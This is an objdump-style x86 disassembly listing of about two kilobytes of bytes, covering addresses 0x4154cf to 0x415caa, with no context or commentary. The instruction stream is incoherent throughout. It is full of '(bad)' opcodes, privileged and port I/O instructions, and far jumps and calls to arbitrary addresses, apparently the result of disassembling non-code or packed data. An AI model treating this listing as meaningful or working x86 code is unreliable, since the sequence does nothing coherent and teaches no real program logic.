  4154cf:	mov    DWORD PTR ds:0x30668a11,eax
  4154d5:	sub    ecx,ecx
  4154d7:	xchg   edi,eax
  4154d8:	and    BYTE PTR [eax+0x5],cl
  4154db:	pop    es
  4154dc:	xchg   DWORD PTR [ecx-0x39],ebx
  4154df:	pop    es
  4154e0:	frstor [eax]
  4154e2:	mov    ebp,0x7a3b2d2c
  4154e7:	adc    edx,esi
  4154e9:	in     eax,0x2e
  4154eb:	enter  0xab5,0x72
  4154ef:	test   DWORD PTR [ecx-0x13],ebp
  4154f2:	fsubr  st,st(7)
  4154f4:	push   esp
  4154f5:	gs push edi
  4154f7:	push   ds
  4154f8:	cmp    edi,DWORD PTR [esi]
  4154fa:	stos   BYTE PTR es:[edi],al
  4154fb:	(bad)  
  4154fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154fd:	call   0xa19cba04
  415502:	adc    esp,DWORD PTR [ecx+0x54]
  415505:	jbe    0x415528
  415507:	push   es
  415508:	jp     0x415532
  41550a:	ins    DWORD PTR es:[edi],dx
  41550b:	pop    ss
  41550c:	(bad)  
  41550e:	mov    esp,0x4071352f
  415513:	idiv   BYTE PTR [edx+0x2e84ce60]
  415519:	int    0xc1
  41551b:	lahf   
  41551c:	mov    ebx,0xb4e24871
  415521:	mov    esp,0xbeadf5ac
  415526:	mov    al,0xf0
  415528:	xchg   edx,eax
  415529:	push   edi
  41552a:	jo     0x41551a
  41552c:	rol    DWORD PTR [ebx],0x63
  41552f:	clc    
  415530:	cmp    eax,0x9e37cd69
  415535:	mov    al,0xdd
  415537:	sub    ebp,ebp
  415539:	popf   
  41553a:	xchg   esi,eax
  41553b:	fstp   DWORD PTR [bx-0x5109]
  415540:	into   
  415541:	sub    ah,BYTE PTR [edx]
  415543:	(bad)  
  415544:	int3   
  415545:	fdiv   QWORD PTR [eax+0x335c4fb7]
  41554b:	shr    DWORD PTR [esi],0xfc
  41554e:	xor    eax,0xfb58247c
  415553:	inc    edx
  415554:	dec    esi
  415555:	pushf  
  415556:	call   0x6e99:0x2f84021
  41555d:	push   esp
  41555e:	sbb    al,BYTE PTR [esi-0x4607ead]
  415564:	jge    0x41551d
  415566:	and    ch,ah
  415568:	fwait
  415569:	mov    dl,0xcd
  41556b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41556c:	inc    ebx
  41556d:	call   0x740e:0x8b05f7d8
  415574:	push   ebx
  415575:	dec    esp
  415576:	adc    ebx,eax
  415578:	adc    edi,DWORD PTR [esi+0x1db56f32]
  41557e:	test   DWORD PTR [edi+0x47],edx
  415581:	xchg   edi,eax
  415582:	les    edx,FWORD PTR [eax-0x67]
  415585:	dec    esi
  415586:	mov    esi,0x4d3dd8de
  41558b:	mov    al,0xff
  41558d:	jo     0x4155fc
  41558f:	ret    
  415590:	mov    ebp,0x8625b960
  415595:	pop    edx
  415596:	int    0x1
  415598:	test   eax,0x5caa8b9a
  41559d:	or     eax,0xc9008c4a
  4155a2:	dec    ecx
  4155a3:	ins    BYTE PTR es:[edi],dx
  4155a4:	outs   dx,DWORD PTR ds:[esi]
  4155a5:	icebp  
  4155a6:	je     0x4155d1
  4155a8:	call   0x4303:0x279b3365
  4155af:	ja     0x4155bb
  4155b1:	aad    0xa
  4155b3:	push   ebp
  4155b4:	retf   
  4155b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b6:	jmp    DWORD PTR ds:0x9a3ac895
  4155bc:	test   eax,0xd6f859ed
  4155c1:	clc    
  4155c2:	push   ds
  4155c3:	sbb    al,0x99
  4155c5:	call   DWORD PTR [ebx]
  4155c7:	inc    eax
  4155c8:	lods   al,BYTE PTR ds:[esi]
  4155c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ca:	fwait
  4155cb:	jmp    0xe2fa42d0
  4155d0:	dec    esi
  4155d1:	push   esp
  4155d2:	xchg   edx,eax
  4155d3:	imul   ecx,DWORD PTR [edi],0x7b
  4155d6:	iret   
  4155d7:	add    eax,DWORD PTR [ecx-0x260c65b4]
  4155dd:	cdq    
  4155de:	mov    esp,0xa44176ee
  4155e3:	pop    edx
  4155e4:	pop    ss
  4155e5:	js     0x4155a7
  4155e7:	(bad)  
  4155e8:	push   edx
  4155e9:	(bad)  
  4155ea:	fcmovnu st,st(7)
  4155ec:	and    al,0x89
  4155ee:	mov    dh,0xe5
  4155f0:	inc    edi
  4155f1:	stos   DWORD PTR es:[edi],eax
  4155f2:	ins    DWORD PTR es:[edi],dx
  4155f3:	xchg   edi,eax
  4155f4:	push   0xe80a52ff
  4155f9:	sti    
  4155fa:	xchg   DWORD PTR [ebp-0x51],ecx
  4155fd:	xor    ecx,DWORD PTR [esi+0x353302fd]
  415603:	pop    ecx
  415604:	repz mov esi,0xe5a3d338
  41560a:	mov    BYTE PTR [esp+esi*2],bl
  41560d:	test   al,0x94
  41560f:	xchg   DWORD PTR [ebx-0xddf69],ecx
  415615:	inc    edx
  415616:	dec    edx
  415617:	and    DWORD PTR [edx],0x3b
  41561a:	sub    al,cl
  41561c:	repz cmp esi,DWORD PTR [edx-0x3985e7e3]
  415623:	or     al,0xa9
  415625:	mov    ch,0x4b
  415627:	xor    ecx,0x35338c89
  41562d:	cmp    eax,0xe092bad1
  415632:	pop    edi
  415633:	dec    esi
  415634:	dec    esp
  415635:	cmp    DWORD PTR ds:0x1424aecb,ebx
  41563b:	stos   DWORD PTR es:[edi],eax
  41563c:	pop    ss
  41563d:	clc    
  41563e:	sahf   
  41563f:	stos   BYTE PTR es:[edi],al
  415640:	and    edx,DWORD PTR [esi-0x5d73f8db]
  415646:	sub    BYTE PTR [edx-0x1f],cl
  415649:	mov    ds:0x15938772,al
  41564e:	in     al,dx
  41564f:	je     0x415607
  415651:	and    eax,0x8af2a6c7
  415656:	(bad)  
  415657:	rol    dh,1
  415659:	outs   dx,BYTE PTR ds:[esi]
  41565a:	add    BYTE PTR [ecx+0x60],bh
  41565d:	push   edx
  41565e:	ret    
  41565f:	retf   
  415660:	sbb    eax,0x508df48e
  415665:	scas   eax,DWORD PTR es:[edi]
  415666:	jmp    0x406a:0xe1276ccc
  41566d:	or     eax,DWORD PTR [ebp-0x43]
  415670:	(bad)  
  415672:	xchg   BYTE PTR [eax-0x8],ch
  415675:	xor    BYTE PTR [ebx-0x721cee25],0xda
  41567c:	mov    ch,0xc9
  41567e:	or     esi,DWORD PTR [edx]
  415680:	mov    bh,0x80
  415682:	sub    DWORD PTR [esi-0x2a],ebx
  415685:	sub    al,0x48
  415687:	stos   BYTE PTR es:[edi],al
  415688:	dec    esi
  415689:	stos   BYTE PTR es:[edi],al
  41568a:	call   FWORD PTR [edi+edi*2-0x392cd2b5]
  415691:	pop    ds
  415692:	mov    edx,edx
  415694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415695:	jmp    0x415634
  415697:	test   al,0xb5
  415699:	xchg   ebp,eax
  41569a:	jecxz  0x415686
  41569c:	daa    
  41569d:	adc    dl,dl
  41569f:	dec    ebx
  4156a0:	mov    ds:0x5ab3d89e,al
  4156a5:	add    BYTE PTR [esi-0x24],0xd2
  4156a9:	inc    ebp
  4156aa:	call   0x8aa64d26
  4156af:	xlat   BYTE PTR ds:[ebx]
  4156b0:	cmp    bl,ah
  4156b2:	mov    bl,0x66
  4156b4:	std    
  4156b5:	cmp    eax,0xd741671f
  4156ba:	push   0x59
  4156bc:	and    DWORD PTR [edx+0x70],eax
  4156bf:	(bad)  
  4156c0:	(bad)  
  4156c1:	and    al,0x17
  4156c3:	mov    esp,0x575ea4d1
  4156c8:	popa   
  4156c9:	hlt    
  4156ca:	mov    ah,0xdb
  4156cc:	sahf   
  4156cd:	push   ds
  4156ce:	pop    ecx
  4156cf:	xchg   edi,eax
  4156d1:	sar    DWORD PTR [edx-0x787417c7],0x8a
  4156d8:	cmc    
  4156d9:	(bad)  
  4156da:	mov    ?,WORD PTR [edi+0xb]
  4156dd:	inc    edi
  4156de:	xor    DWORD PTR [edi-0x7766b1fa],0x37
  4156e5:	in     eax,dx
  4156e6:	sbb    cl,BYTE PTR [ebx]
  4156e8:	je     0x4156df
  4156ea:	jle    0x415732
  4156ec:	mov    esi,0xc4ed8267
  4156f1:	jnp    0x415698
  4156f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f4:	push   0xfffffffd
  4156f6:	dec    ecx
  4156f7:	sbb    DWORD PTR [edi+0x71be2812],0x645048ee
  415701:	leave  
  415702:	jge    0x41574c
  415704:	(bad)  
  415705:	cli    
  415706:	and    edi,DWORD PTR [eax]
  415708:	sbb    ecx,eax
  41570a:	jo     0x4156b1
  41570c:	outs   dx,BYTE PTR ds:[esi]
  41570d:	xor    BYTE PTR [ebx+0x51],al
  415710:	push   edx
  415711:	mov    ebx,0x2bacb1a4
  415716:	push   ebx
  415717:	mov    ah,0x7f
  415719:	xor    bl,dh
  41571b:	push   es
  41571c:	adc    eax,0xd2683a03
  415721:	mov    bl,0xac
  415723:	jne    0x415746
  415725:	jns    0x415781
  415727:	dec    eax
  415728:	ss xor al,0xdb
  41572b:	jmp    0xeba0bab0
  415730:	das    
  415731:	xchg   dl,al
  415733:	add    eax,0x8daea2e1
  415738:	fwait
  415739:	add    bh,BYTE PTR gs:[eax+0x3]
  41573d:	fwait
  41573e:	mov    edx,0x5bbce82a
  415743:	lock xor eax,0xf9906332
  415749:	sub    eax,0x3b9903d8
  41574e:	push   0x49eb6d45
  415753:	add    al,0xb
  415755:	bound  esi,QWORD PTR [esi+0x15]
  415758:	and    ecx,0xffffffa2
  41575b:	ret    
  41575c:	in     al,0x5e
  41575e:	stos   DWORD PTR es:[edi],eax
  41575f:	je     0x4156f2
  415761:	add    edx,DWORD PTR [edi]
  415763:	xor    BYTE PTR [esi+ebp*8-0x1e],bh
  415767:	sub    ebx,DWORD PTR [edi]
  415769:	rcr    DWORD PTR [ebx],cl
  41576b:	mov    eax,edi
  41576d:	jmp    0x41577f
  41576f:	dec    ecx
  415770:	mov    ebx,0xd602eb7f
  415775:	pop    edx
  415776:	sbb    ebx,DWORD PTR [edx-0x7aae54b9]
  41577c:	clc    
  41577d:	sub    eax,0xc1911d36
  415782:	stos   DWORD PTR es:[edi],eax
  415783:	xchg   esp,eax
  415784:	popa   
  415785:	aaa    
  415786:	ins    DWORD PTR es:[edi],dx
  415787:	jp     0x4157bc
  415789:	pop    es
  41578a:	data16 adc BYTE PTR [ecx-0x225a6f6a],bh
  415791:	mov    ds:0xe8fd1c51,eax
  415796:	pusha  
  415797:	int    0xbf
  415799:	mov    ds:0x4a4466b1,al
  41579e:	test   al,0x9f
  4157a0:	sub    ebp,edi
  4157a2:	sbb    DWORD PTR [edi],edx
  4157a4:	inc    edx
  4157a5:	int3   
  4157a6:	jo     0x4157c0
  4157a8:	ins    BYTE PTR es:[edi],dx
  4157a9:	or     dh,ah
  4157ab:	ins    DWORD PTR es:[edi],dx
  4157ac:	pop    ebp
  4157ad:	inc    esi
  4157ae:	push   ebx
  4157af:	cld    
  4157b0:	je     0x41579e
  4157b2:	(bad)  
  4157b3:	cmp    eax,0x17dd9f6f
  4157b8:	xchg   BYTE PTR [ebp-0x30],al
  4157bb:	popf   
  4157bc:	dec    ebp
  4157bd:	mov    bh,0x64
  4157bf:	leave  
  4157c0:	les    esi,FWORD PTR ds:0xa9e1d380
  4157c6:	pop    ebx
  4157c7:	call   0x36b5c6c5
  4157cc:	sti    
  4157cd:	mov    al,ds:0xbeece181
  4157d2:	push   ebx
  4157d3:	cdq    
  4157d4:	loopne 0x415829
  4157d6:	sbb    edi,0x2a07d956
  4157dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157dd:	or     ah,BYTE PTR [eax+0x12]
  4157e0:	imul   edi,ecx,0xffffffdc
  4157e3:	fucomip st,st(1)
  4157e5:	cmp    ecx,DWORD PTR [esi-0x3744b5ba]
  4157eb:	push   0x7e
  4157ed:	mov    esp,0x69c11ad3
  4157f2:	clc    
  4157f3:	shl    DWORD PTR [edi-0x6],cl
  4157f6:	mul    BYTE PTR cs:[eax+0x76]
  4157fa:	xchg   ebp,eax
  4157fb:	sbb    al,0x1a
  4157fd:	xchg   DWORD PTR [ebx-0x5559777d],esp
  415803:	in     al,0x2f
  415805:	hlt    
  415806:	jle    0x4157d8
  415808:	mov    al,ds:0x1b3ecba0
  41580d:	jl     0x415801
  41580f:	test   BYTE PTR [edx+0x4344afc6],al
  415815:	xor    al,0xaa
  415817:	lods   eax,DWORD PTR ds:[esi]
  415818:	hlt    
  415819:	ficom  WORD PTR [edi]
  41581b:	inc    ebx
  41581c:	pop    ebp
  41581d:	jb     0x4157f6
  41581f:	fsubr  QWORD PTR [edi-0x6183c889]
  415825:	xor    DWORD PTR [ebp-0x69],ecx
  415828:	sbb    DWORD PTR [eax+0xb],edx
  41582b:	enter  0xf14f,0xd0
  41582f:	enter  0x90a9,0x91
  415833:	lahf   
  415834:	jle    0x4157dd
  415836:	jmp    0x927f946f
  41583b:	dec    ebp
  41583c:	sbb    edx,ebp
  41583e:	push   eax
  41583f:	push   esi
  415840:	in     al,0x53
  415842:	adc    cl,BYTE PTR [eax+0x1e]
  415845:	aad    0x59
  415847:	std    
  415848:	cmp    BYTE PTR [edx],dh
  41584a:	fldenv [esi]
  41584c:	and    DWORD PTR [edx],edx
  41584e:	or     al,0xd4
  415850:	or     eax,0xf8cc4521
  415855:	loope  0x4158a9
  415857:	jae    0x4158d7
  415859:	mov    DWORD PTR [edi],ebx
  41585b:	scas   al,BYTE PTR es:[edi]
  41585c:	ret    0x66fe
  41585f:	push   ds
  415860:	into   
  415861:	sbb    ebx,DWORD PTR [edi-0x56]
  415864:	test   DWORD PTR [ebp+0x43],edi
  415867:	pop    edi
  415868:	mov    edx,0xb8a6262a
  41586d:	jo     0x4158ca
  41586f:	xchg   DWORD PTR ds:0x18c57799,esi
  415875:	fsubr  QWORD PTR [edx]
  415877:	xchg   esp,eax
  415878:	sahf   
  415879:	push   cs
  41587a:	lods   eax,DWORD PTR ds:[esi]
  41587b:	jle    0x415824
  41587d:	and    BYTE PTR [edx-0x402762e3],bh
  415883:	iret   
  415884:	fmul   st(7),st
  415886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415887:	gs dec ecx
  415889:	inc    esp
  41588a:	popa   
  41588b:	push   ebx
  41588c:	sbb    bl,ah
  41588e:	cmp    esp,DWORD PTR [ebp-0x3b9e9593]
  415894:	jmp    0xd0f5:0x11279cac
  41589b:	popf   
  41589c:	pop    ecx
  41589d:	jmp    0x9feb:0x5d45d1c1
  4158a4:	mov    eax,ds:0xb4d9c82f
  4158a9:	push   cs
  4158aa:	aad    0xb8
  4158ac:	stos   BYTE PTR es:[edi],al
  4158ad:	arpl   WORD PTR ds:0xa49c286a,cx
  4158b3:	addr16 jb 0x41588a
  4158b6:	mov    dl,bl
  4158b8:	and    al,0x48
  4158ba:	stos   BYTE PTR es:[edi],al
  4158bb:	pop    ss
  4158bc:	(bad)  
  4158bf:	add    al,0x18
  4158c1:	ret    0xb3f1
  4158c4:	inc    eax
  4158c5:	and    eax,0xf1ce3303
  4158ca:	sbb    BYTE PTR [eax-0x7d],dl
  4158cd:	cmp    dl,BYTE PTR [edi+0x449e2d0b]
  4158d3:	jmp    0xa1bf33ca
  4158d8:	pushf  
  4158d9:	dec    edx
  4158da:	sbb    ch,BYTE PTR [eax+0x68]
  4158dd:	clc    
  4158de:	xor    ebx,ebx
  4158e0:	jo     0x4158c7
  4158e2:	mov    dl,0xfb
  4158e4:	xchg   ebx,eax
  4158e5:	xchg   ebp,eax
  4158e6:	add    ebx,DWORD PTR [eax-0x6]
  4158e9:	out    dx,al
  4158ea:	lods   eax,DWORD PTR ds:[esi]
  4158eb:	xor    eax,0x40df42a0
  4158f0:	outs   dx,BYTE PTR ds:[esi]
  4158f1:	lock test BYTE PTR [edx+0x13606b99],0x9f
  4158f9:	sub    eax,0x3c2146a9
  4158fe:	mov    eax,ds:0xf78e251a
  415903:	outs   dx,DWORD PTR ds:[esi]
  415904:	je     0x415972
  415906:	push   esi
  415907:	test   BYTE PTR [ecx+0x338868a7],dh
  41590d:	in     al,0x7
  41590f:	mov    al,0xd2
  415911:	xor    ebp,DWORD PTR [eax]
  415913:	js     0x415896
  415915:	scas   eax,DWORD PTR es:[edi]
  415916:	loop   0x4158a9
  415918:	call   FWORD PTR [ebp-0x20ee0dc8]
  41591e:	mov    ds:0x3650b468,eax
  415923:	and    DWORD PTR [eax-0x6c],0x17f49ba2
  41592a:	sbb    dh,BYTE PTR [esi]
  41592c:	inc    esi
  41592d:	push   esp
  41592e:	mov    dl,0xc4
  415930:	cdq    
  415931:	sub    BYTE PTR [eax+0x5],0x81
  415935:	stos   BYTE PTR es:[edi],al
  415936:	inc    esp
  415937:	lods   al,BYTE PTR ds:[esi]
  415938:	(bad)  
  415939:	lahf   
  41593a:	sub    eax,0x44d88b0d
  41593f:	xor    edi,DWORD PTR [edx]
  415941:	mov    al,ds:0xad5f1050
  415946:	lock inc ebx
  415948:	je     0x41598d
  41594a:	push   ds
  41594b:	adc    al,0x98
  41594d:	add    al,0x2b
  41594f:	sahf   
  415950:	jo     0x415938
  415952:	es adc ah,cl
  415955:	cwde   
  415956:	xchg   ebp,edx
  415958:	jb     0x415946
  41595a:	aaa    
  41595b:	cs mov ebx,0xaf12847e
  415961:	neg    DWORD PTR [edi]
  415963:	das    
  415964:	popa   
  415965:	and    cl,bh
  415967:	xor    ebp,DWORD PTR [edx+0x27]
  41596a:	cmp    DWORD PTR [ebx+0x68e060b7],ebp
  415970:	push   ss
  415971:	cmp    esi,esp
  415973:	dec    eax
  415974:	xchg   edx,eax
  415975:	xchg   esi,eax
  415976:	adc    BYTE PTR [ebx-0x54],0x71
  41597a:	out    dx,eax
  41597b:	test   al,0xf9
  41597d:	lahf   
  41597e:	out    dx,eax
  41597f:	cdq    
  415980:	xchg   esi,eax
  415981:	xchg   ecx,eax
  415982:	js     0x4159e4
  415984:	dec    esi
  415985:	fcom   QWORD PTR [ebx]
  415987:	fdiv   st(3),st
  415989:	sub    BYTE PTR [eax+0x32a9d920],bl
  41598f:	jmp    0x52a4:0x95df27c6
  415996:	mov    ss:0x76b6070a,al
  41599c:	cmp    al,0x10
  41599e:	dec    ecx
  41599f:	inc    ebp
  4159a0:	inc    ebp
  4159a1:	sub    edi,0xeb585bae
  4159a7:	lds    edi,FWORD PTR [ebp+0x4b]
  4159aa:	sbb    al,0xf7
  4159ac:	jge    0x415a1b
  4159ae:	popf   
  4159af:	mov    ebx,0x84ce02df
  4159b4:	retf   
  4159b5:	add    BYTE PTR [ebp+0x7c],dl
  4159b8:	rcr    dh,1
  4159ba:	in     al,0x1a
  4159bc:	jge    0x41595f
  4159be:	and    edi,DWORD PTR [esi]
  4159c0:	mov    edi,DWORD PTR [edx-0x28]
  4159c3:	in     al,0x22
  4159c5:	fild   WORD PTR [ebp+0x4e053d36]
  4159cb:	push   ss
  4159cc:	fldcw  WORD PTR [ebp-0x214d3f26]
  4159d2:	adc    al,0x96
  4159d4:	aad    0x58
  4159d6:	fs cld 
  4159d8:	mov    es,WORD PTR [ecx+0x13421358]
  4159de:	jle    0x4159c1
  4159e0:	mov    edi,0x3b8f5cbe
  4159e5:	add    eax,0x928797b3
  4159ea:	push   esi
  4159eb:	or     BYTE PTR [edi-0x5736bf40],ch
  4159f1:	dec    esp
  4159f2:	mov    edx,0xf59902e8
  4159f7:	mov    cl,0x31
  4159f9:	inc    ebx
  4159fa:	cwde   
  4159fb:	mov    DWORD PTR [ebp-0x13],ebp
  4159fe:	pop    ebx
  4159ff:	leave  
  415a00:	loopne 0x4159c7
  415a02:	jmp    FWORD PTR [esi]
  415a04:	inc    ebp
  415a05:	mov    eax,0x998cc997
  415a0a:	mov    ebp,0x82778cbb
  415a0f:	or     al,BYTE PTR [bx+si+0x3938]
  415a14:	add    DWORD PTR [ebp-0x4525a713],0x5ad55ee0
  415a1e:	cmp    ch,BYTE PTR [ebx+0x2f63e7cf]
  415a24:	cmp    al,0xee
  415a26:	cs loope 0x415a4e
  415a29:	mov    edx,0xf04410b8
  415a2e:	ds dec esp
  415a30:	mov    dl,0x9a
  415a32:	cmp    DWORD PTR [ebp+0x6a],edi
  415a35:	push   esi
  415a36:	jbe    0x415a78
  415a38:	mov    dl,0xd6
  415a3a:	pop    ecx
  415a3b:	outs   dx,DWORD PTR ds:[esi]
  415a3c:	push   ds
  415a3d:	dec    ebx
  415a3e:	shl    bl,cl
  415a40:	dec    ecx
  415a41:	popf   
  415a42:	out    0xa1,eax
  415a44:	aas    
  415a45:	lods   al,BYTE PTR ds:[esi]
  415a46:	cmp    DWORD PTR [eax-0x5],edi
  415a49:	dec    edx
  415a4a:	push   ecx
  415a4b:	in     eax,dx
  415a4c:	xchg   esi,eax
  415a4d:	ds in  al,dx
  415a4f:	loopne 0x415a18
  415a51:	jmp    0xb4d2:0xc0d54c92
  415a58:	push   0x31
  415a5a:	sbb    bh,bl
  415a5c:	xor    bl,BYTE PTR [ebp-0x58]
  415a5f:	jmp    0x415a80
  415a61:	adc    cl,dl
  415a63:	out    dx,al
  415a64:	ss pop es
  415a66:	loop   0x4159fd
  415a68:	cmc    
  415a69:	dec    DWORD PTR [ebp+0x7cc8b11f]
  415a6f:	ins    DWORD PTR es:[edi],dx
  415a70:	mov    ebp,esi
  415a72:	in     eax,0xb1
  415a74:	pop    ebx
  415a75:	xchg   ebx,eax
  415a76:	test   eax,0x5fdd3e51
  415a7b:	cmp    bh,BYTE PTR [ecx]
  415a7d:	dec    ebp
  415a7e:	in     al,dx
  415a7f:	repz ds ret 
  415a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a83:	es and al,0x86
  415a86:	or     eax,0xbdc39a4c
  415a8b:	or     eax,0x7d8ae9a9
  415a90:	mov    dh,0x8a
  415a92:	xor    eax,0x40fc5ec3
  415a97:	xchg   ebp,eax
  415a98:	or     BYTE PTR [edi+0x3],ah
  415a9b:	jmp    0x415b0f
  415a9d:	sub    bl,BYTE PTR [edx-0x4e]
  415aa0:	shr    DWORD PTR [ebx],0xcd
  415aa3:	call   0xebd36343
  415aa8:	leave  
  415aa9:	daa    
  415aaa:	and    eax,0xee97216b
  415aaf:	dec    eax
  415ab0:	inc    esp
  415ab1:	sub    eax,0xf7f0fa80
  415ab6:	sbb    eax,0x72872349
  415abb:	mov    bh,0x4a
  415abd:	add    al,0x55
  415abf:	and    esp,DWORD PTR [ebp+ecx*4+0x70487d3a]
  415ac6:	push   esp
  415ac7:	xchg   edx,ebx
  415ac9:	pop    es
  415aca:	pop    es
  415acb:	shl    DWORD PTR [esi-0x61],0x25
  415acf:	push   ecx
  415ad0:	sti    
  415ad1:	pop    edi
  415ad2:	or     eax,0x1494606c
  415ad7:	loop   0x415b27
  415ad9:	sbb    ecx,esi
  415adb:	fwait
  415adc:	pop    edx
  415add:	push   ecx
  415ade:	ficomp DWORD PTR [ebx-0x39]
  415ae1:	mov    dh,ah
  415ae3:	push   ebx
  415ae4:	sbb    DWORD PTR [edi-0x2ddfe69c],esi
  415aea:	sub    cl,al
  415aec:	cld    
  415aed:	sbb    ebx,DWORD PTR [eax]
  415aef:	push   edx
  415af0:	je     0x415adb
  415af2:	sbb    BYTE PTR [edx+0x1bea51f3],cl
  415af8:	ds in  al,dx
  415afa:	xchg   esp,eax
  415afb:	mov    ds:0x21c1d526,al
  415b00:	jmp    0xbf3ed081
  415b05:	(bad)  
  415b06:	sub    al,0x84
  415b08:	pop    ds
  415b09:	push   edi
  415b0a:	clc    
  415b0b:	adc    ch,BYTE PTR [ebp-0x3dc6c10]
  415b11:	arpl   WORD PTR [ebx],di
  415b13:	(bad)  
  415b15:	and    al,0x73
  415b17:	pop    ebp
  415b18:	mul    BYTE PTR [edx]
  415b1a:	aad    0xc8
  415b1c:	out    dx,eax
  415b1d:	aas    
  415b1e:	inc    sp
  415b20:	pop    ebp
  415b21:	in     al,dx
  415b22:	(bad)  
  415b23:	sbb    BYTE PTR [eax+ebx*1],bl
  415b26:	mov    ebp,0xb5a6b0f3
  415b2b:	rcr    DWORD PTR [edi+0x1a4f6e0d],1
  415b31:	dec    esp
  415b32:	mov    DWORD PTR [ecx+0x20],ebp
  415b35:	or     eax,DWORD PTR [ecx+0x30]
  415b38:	stos   DWORD PTR es:[edi],eax
  415b39:	or     eax,0xc2969956
  415b3e:	mov    ch,BYTE PTR [edx+0x25f1d72b]
  415b44:	cwde   
  415b45:	mov    BYTE PTR [ecx],bh
  415b47:	sub    cl,BYTE PTR [ecx+0x5a]
  415b4a:	retf   0x5d6f
  415b4d:	dec    ebx
  415b4e:	nop
  415b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b50:	popa   
  415b51:	icebp  
  415b52:	fist   WORD PTR [ecx]
  415b54:	sub    al,0x4a
  415b56:	popf   
  415b57:	adc    bl,bh
  415b59:	or     eax,0x499b42d9
  415b5e:	xchg   ebx,eax
  415b5f:	xor    dh,al
  415b61:	and    BYTE PTR [eax+0x7043e5de],al
  415b67:	cmp    dl,al
  415b69:	pop    ebp
  415b6a:	or     BYTE PTR [edx],cl
  415b6c:	mov    ch,0xf7
  415b6e:	jp     0x415b15
  415b70:	in     eax,dx
  415b71:	ja     0x415bda
  415b73:	mov    ds:0x57b53b35,al
  415b78:	imul   esi,DWORD PTR [ebx+0x4f],0xffffffe7
  415b7c:	hlt    
  415b7d:	(bad)  
  415b7e:	sbb    BYTE PTR [edx],ah
  415b80:	js     0x415be3
  415b82:	mov    BYTE PTR [eax+0x25a4a2a5],dh
  415b88:	mov    BYTE PTR [eax+0x4d],dh
  415b8b:	push   cs
  415b8c:	adc    eax,0x6d05acf9
  415b91:	jno    0x415c06
  415b93:	inc    edx
  415b94:	lds    edi,FWORD PTR [ebp+0x3b]
  415b97:	aas    
  415b98:	ja     0x415c01
  415b9a:	jne    0x415c0c
  415b9c:	xchg   ebx,eax
  415b9d:	mov    esp,gs
  415b9f:	and    eax,0x2d0eb08c
  415ba4:	nop
  415ba5:	shl    ebx,cl
  415ba7:	jge    0x415b3f
  415ba9:	mov    edi,DWORD PTR gs:[ebp+0x77299edb]
  415bb0:	push   cs
  415bb1:	xor    ah,BYTE PTR [edi+0x7]
  415bb4:	dec    eax
  415bb5:	jbe    0x415bfe
  415bb7:	add    edx,edi
  415bb9:	imul   edi,DWORD PTR [edx],0xe544cf05
  415bbf:	jmp    0x788e9ae8
  415bc4:	mov    ah,0xa5
  415bc6:	aad    0xc2
  415bc8:	stos   BYTE PTR es:[edi],al
  415bc9:	xchg   esi,eax
  415bca:	repz jns 0x415bf7
  415bcd:	add    al,BYTE PTR [edi]
  415bcf:	mov    esp,0x464bffef
  415bd4:	lods   eax,DWORD PTR ds:[esi]
  415bd5:	scas   eax,DWORD PTR es:[edi]
  415bd6:	mov    al,ds:0x844a2fb7
  415bdb:	xchg   esp,eax
  415bdc:	popa   
  415bdd:	sti    
  415bde:	popf   
  415bdf:	jle    0x415bdd
  415be1:	xor    al,0x4c
  415be3:	aad    0x29
  415be5:	adc    DWORD PTR [edi+0x46124836],ebx
  415beb:	cmp    esi,DWORD PTR [esi+edx*1+0x41781406]
  415bf2:	sbb    cl,0xf8
  415bf5:	jmp    0x415c3a
  415bf7:	add    BYTE PTR [edi+ebp*2-0x5b4b69ef],ch
  415bfe:	pop    eax
  415bff:	(bad)  
  415c00:	mov    edx,0xabe4fbd4
  415c05:	ins    DWORD PTR es:[edi],dx
  415c06:	mov    esi,0x50e38e61
  415c0b:	clc    
  415c0c:	adc    eax,0x1c43a2df
  415c11:	add    al,0x5b
  415c13:	pop    edi
  415c14:	dec    esi
  415c15:	or     eax,0x3305af23
  415c1a:	in     al,0x16
  415c1c:	mov    bh,0x75
  415c1e:	mov    esi,0xaec0e522
  415c23:	aam    0xcf
  415c25:	xchg   DWORD PTR [edx],ebp
  415c27:	sahf   
  415c28:	mov    bh,0xdb
  415c2a:	aad    0x40
  415c2c:	nop
  415c2d:	sub    esi,DWORD PTR [ecx+0x71c4aaf3]
  415c33:	mov    eax,0x929d0d86
  415c38:	cmp    cl,BYTE PTR ds:0x7a278287
  415c3e:	inc    edx
  415c3f:	sub    bh,BYTE PTR [esp+ebp*4+0x70]
  415c43:	aaa    
  415c44:	out    0x63,al
  415c46:	retf   0x186d
  415c49:	sub    BYTE PTR [ebp+0x680d47a],bh
  415c4f:	cmp    ah,bl
  415c51:	mov    edx,es
  415c53:	fdivp  st(5),st
  415c55:	arpl   cx,dx
  415c57:	and    BYTE PTR [ebp+0x5fa3e126],bl
  415c5d:	dec    ebx
  415c5e:	out    0xfc,eax
  415c60:	out    dx,al
  415c61:	test   eax,0xf5935e64
  415c66:	les    edx,FWORD PTR [edx+0x78e5f5ca]
  415c6c:	jmp    0x415caa
  415c6e:	aad    0xf5
  415c70:	or     eax,DWORD PTR [eax+ebp*1-0x60543c12]
  415c77:	add    DWORD PTR [edx-0x261b6c46],ebx
  415c7d:	mov    eax,ds:0xfcbbf162
  415c82:	cmp    ah,BYTE PTR [edx-0x2d09058]
  415c88:	adc    DWORD PTR [eax-0x1e23bd56],eax
  415c8e:	add    esp,edi
  415c90:	dec    ebx
  415c91:	push   edx
  415c92:	jecxz  0x415c66
  415c94:	mov    dh,0xab
  415c96:	(bad)  
  415c97:	dec    esi
  415c98:	hlt    
  415c99:	dec    edi
  415c9a:	call   FWORD PTR [eax+0x66fb1d55]
  415ca0:	pop    edx
  415ca1:	aam    0xf8
  415ca3:	cmp    ah,bh
  415ca5:	pop    eax
  415ca6:	ds inc esp
  415ca8:	or     al,0xd7
  415caa:	sahf   
